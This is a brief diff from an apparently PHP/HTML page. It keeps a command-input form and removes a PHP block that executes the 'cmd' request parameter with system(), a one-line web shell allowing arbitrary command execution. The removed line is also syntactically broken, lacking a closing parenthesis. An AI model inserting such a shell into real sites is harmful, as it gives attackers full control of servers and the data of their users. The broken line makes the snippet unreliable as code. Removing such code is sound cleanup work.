@@ -3,8 +3,4 @@
 <input type=text name=cmd />
 <input type=submit value=do />
 </form>
-<?php
 
-if(isset($_GET['cmd']) system($_GET['cmd']);
-
-?>
